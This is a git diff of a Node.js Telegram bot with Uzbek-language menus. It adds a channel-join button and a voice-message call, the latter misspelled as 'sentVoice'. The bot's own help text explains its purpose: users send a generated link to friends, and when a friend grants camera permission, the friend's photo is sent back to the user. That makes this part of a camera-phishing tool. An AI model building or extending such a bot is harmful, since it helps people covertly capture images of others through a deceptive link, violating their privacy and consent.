@@ -1,6 +1,6 @@
 import express from "express";
 import TelegramBot from "node-telegram-bot-api";
-import path from "path";
+import path, { parse } from "path";
 import { fileURLToPath } from "url";
 import fs from "fs";
 import { text } from "stream/consumers";
@@ -24,10 +24,7 @@ bot.setWebHook(`${BASE_URL}/bot${TOKEN}`);
 const buttons = {
   reply_markup: {
     keyboard: [
-      [
-        { text: "📸 Rasm olish" },
-        { text: "📢 Kanal", url: "https://t.me/koryapman_bot" },
-      ],
+      [{ text: "📸 Rasm olish" }, { text: "📢 Kanal" }],
       [{ text: "🆘 Yordam" }],
     ],
 
@@ -64,11 +61,32 @@ bot.on("message", (msg) => {
       `📷 Rasm olish uchun quyidagi havolani bosing:\n\n${url}`
     );
   }
+  if (text === "📢 Kanal") {
+    bot.sendMessage(
+      chatId,
+      "*Kanalga qo‘shilish uchun pastdagi tugmani bosing.*",
+      {
+        parse_mode: "Markdown",
+        reply_markup: {
+          inline_keyboard: [
+            [
+              {
+                text: "📢 Kanalga qo‘shilish",
+                url: "https://t.me/koryapman_bot",
+              },
+            ],
+          ],
+        },
+      }
+    );
+  }
+
   if (text === "🆘 Yordam") {
     bot.sendMessage(
       chatId,
       "Shunchaki 📸 Rasm olish tugmasni bosing va berilgan linkni dostingizga jonating. Agar dostingiz linkga kirib kamera ruxsatiga rozilik bildirsa sizga uning rasmi yuboriladi.\n\nFaqat to'g'ri yo'lda foydalaning."
     );
+    bot.sentVoice(chatId, "music/koryapman.ogg");
   }
 });
 
